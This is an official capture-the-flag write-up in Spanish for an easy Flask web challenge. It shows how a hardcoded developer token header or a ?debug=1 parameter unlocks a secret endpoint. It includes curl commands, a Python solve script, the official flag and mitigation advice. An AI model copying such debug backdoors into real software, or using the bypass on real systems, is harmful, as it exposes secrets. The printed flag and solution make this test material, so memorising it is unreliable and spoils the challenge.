# Writeup Oficial: Template Web Challenge

- **Categoría:** Web
- **Dificultad:** Easy
- **Autor:** DevOps Team
- **Flag Oficial:** `CHRONOS{d3fault_fl4g_f0r_t3mplat3_ch4ll3ng3}`

---

## 1. Resumen Ejecutivo
El reto consiste en una aplicación web ligera desarrollada en Python (Flask). El objetivo es familiarizarse con el flujo de inspección de endpoints, parámetros de consulta y cabeceras HTTP para descubrir información sensible expuesta de manera accidental.

---

## 2. Análisis de Vulnerabilidad

Al revisar el código fuente de la aplicación (`src/app.py`):
1. La ruta `/health` provee el estado operativo del servicio para el healthcheck de Docker.
2. La ruta raíz `/` muestra una interfaz de bienvenida con pistas sobre la arquitectura del servidor.
3. El endpoint administrativo `/api/v1/secret-vault` verifica el parámetro de cabecera `X-Developer-Token` o el parámetro de consulta `?debug=1`.
4. Si se envía la cabecera correcta o el parámetro de depuración, la aplicación retorna la variable de entorno `FLAG`.

---

## 3. Pasos de Explotación

### Método 1: Solicitud con cURL
Ejecutar la siguiente petición HTTP contra la dirección del reto:

```bash
curl -s -H "X-Developer-Token: chronos_internal_debug" http://localhost:8000/api/v1/secret-vault
```

O alternativamente mediante el flag de depuración:

```bash
curl -s "http://localhost:8000/api/v1/secret-vault?debug=1"
```

Respuesta esperada:
```json
{
  "status": "success",
  "message": "Vault unlocked! Welcome operator.",
  "flag": "CHRONOS{d3fault_fl4g_f0r_t3mplat3_ch4ll3ng3}"
}
```

---

## 4. Script de Explotación Automatizado (`solution/solve.py`)

```python
#!/usr/bin/env python3
import sys
import requests

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"

def solve():
    url = f"{TARGET_URL}/api/v1/secret-vault"
    headers = {"X-Developer-Token": "chronos_internal_debug"}
    
    print(f"[*] Enviando exploit a: {url}")
    response = requests.get(url, headers=headers, timeout=5)
    
    if response.status_code == 200:
        data = response.json()
        flag = data.get("flag")
        print(f"[+] ¡Flag recuperada con éxito!: {flag}")
        return flag
    else:
        print(f"[-] Error: Código de estado {response.status_code}")
        return None

if __name__ == "__main__":
    solve()
```

---

## 5. Mitigación y Buenas Prácticas
Para corregir esta vulnerabilidad en entornos reales:
- Eliminar rutas y tokens de depuración antes del pase a producción.
- Centralizar la gestión de secretos en almacenes dedicados (ej. Azure Key Vault / HashiCorp Vault) con control de acceso basado en roles (RBAC).
